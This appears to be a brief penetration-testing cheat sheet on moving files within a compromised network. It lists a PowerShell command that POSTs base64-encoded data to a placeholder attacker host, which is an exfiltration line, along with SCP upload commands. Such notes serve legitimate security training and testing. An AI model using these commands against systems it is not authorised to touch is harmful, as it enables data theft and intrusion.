**Overview:**
 - Attackers frequently exploit legitimate services (like SSH or FTP) to move files quietly within a compromised network.
 - File transfers look simple but are powerful: misconfigured SSH, FTP, NFS or MS‑SQL services let attackers stage payloads, exfiltrate secrets, or pivot to the OS with minimal fuss.
---
## Web Servers

```
Invoke-WebRequest -Uri http://<lhost>:<port> -Method POST -Body $b64
```

Uploads a file with PowerShell. Windows host.

---
## SCP

```
scp C:\Temp\<file> <user>@<target>:/tmp/<file>
```

Uploads a file using SCP. Windows host.

```
scp /tmp/<file> <user>@<target>:/tmp/<file>
```

Uploads a file using SCP. Linux host.